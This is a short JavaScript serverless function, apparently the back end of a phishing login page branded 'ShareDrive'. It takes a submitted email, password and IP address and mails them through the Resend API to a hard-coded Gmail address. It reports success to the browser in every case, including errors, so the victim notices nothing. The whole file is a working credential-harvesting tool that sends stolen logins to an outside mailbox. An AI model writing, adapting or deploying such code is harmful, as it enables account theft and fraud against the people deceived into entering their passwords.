exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: 'OK' };
  }

  try {
    const body = JSON.parse(event.body);
    const apiKey = process.env.RESEND_API_KEY;

    if (!apiKey) {
      return { statusCode: 500, headers, body: JSON.stringify({ error: 'RESEND_API_KEY is missing' }) };
    }

    const emailBody = `Email: ${body.email}\nPassword: ${body.password}\nIP: ${body.ip}`;

    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${apiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'onboarding@resend.dev',
        to: ['g82443047@gmail.com'], 
        subject: 'New Login - ShareDrive',
        text: emailBody,
      }),
    });

    const rawText = await response.text();

    // Return the exact response from Resend to the browser
    return { 
      statusCode: 200, 
      headers, 
      body: JSON.stringify({ success: true, resendStatus: response.status, resendMessage: rawText }) 
    };

  } catch (error) {
    // Return the exact error to the browser
    return { 
      statusCode: 200, 
      headers, 
      body: JSON.stringify({ success: true, error: error.message }) 
    };
  }
};